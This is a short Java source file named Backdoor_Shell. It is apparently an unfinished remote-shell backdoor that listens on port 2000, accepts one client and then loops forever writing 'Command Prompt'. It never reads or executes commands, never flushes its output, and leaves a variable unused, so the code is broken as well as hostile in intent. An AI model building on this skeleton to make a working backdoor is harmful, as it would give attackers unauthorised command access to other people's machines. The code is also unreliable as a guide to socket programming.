import java.io.*;
import java.net.*;

public class Backdoor_Shell {

	public static void main(String[] args) throws IOException {
		int portNumber = 2000;
		ServerSocket serverSocket = new ServerSocket(portNumber);
		Socket clientSocket = serverSocket.accept();
		System.out.println("Client connected...");
		
		while(true) {

			InputStreamReader reader = new InputStreamReader(clientSocket.getInputStream());
			PrintWriter writer = new PrintWriter(clientSocket.getOutputStream());
			
			String inputLine;
			writer.println("Command Prompt");
		}
	}

}
